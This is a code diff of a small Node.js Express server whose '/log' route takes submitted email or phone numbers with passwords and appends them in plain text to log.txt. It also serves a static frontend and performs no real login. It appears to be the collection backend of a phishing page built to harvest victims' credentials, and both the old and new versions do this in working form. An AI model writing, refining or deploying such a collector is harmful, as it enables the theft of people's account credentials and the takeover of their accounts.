@@ -1,38 +1,36 @@
 const express = require('express');
 const fs = require('fs');
 const path = require('path');
-const bodyParser = require('body-parser');
 const app = express();
-const PORT = process.env.PORT || 3000;
 
 // Middleware
-app.use(bodyParser.urlencoded({ extended: true }));
-app.use(bodyParser.json());
-app.use(express.static('public')); // For your HTML/CSS/JS files
+app.use(express.json());
+app.use(express.static('public')); // serves HTML, CSS, JS from /public
 
-// Route to handle login
+// Log email & password to log.txt
 app.post('/log', (req, res) => {
   const { email, password } = req.body;
-  const logData = `Email/Number: ${email}, Password: ${password}`;
 
-  // Log to Render's console
-  console.log(logData);
+  if (!email || !password) {
+    return res.status(400).send('Missing fields');
+  }
 
-  // Save to log.txt file
-  fs.appendFile('log.txt', logData + '\n', err => {
+  const logLine = `Email/Phone: ${email} | Password: ${password}\n`;
+
+  fs.appendFile(path.join(__dirname, 'log.txt'), logLine, err => {
     if (err) {
-      console.error('Failed to save log:', err);
+      console.error('Error writing to file:', err);
       return res.status(500).send('Server error');
     }
-    res.sendStatus(200);
+    res.send('Logged');
   });
 });
 
-// Serve frontend (index.html)
-app.get('/', (req, res) => {
-  res.sendFile(path.join(__dirname, 'public', 'index.html'));
-});
-
+// Start the server
+const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
-  console.log(`Server running on port ${PORT}`);
+  console.log(`Server is running on port ${PORT}`);
+});
+app.get('/', (req, res) => {
+  res.send('Brooo your server is working with your code!');
 });
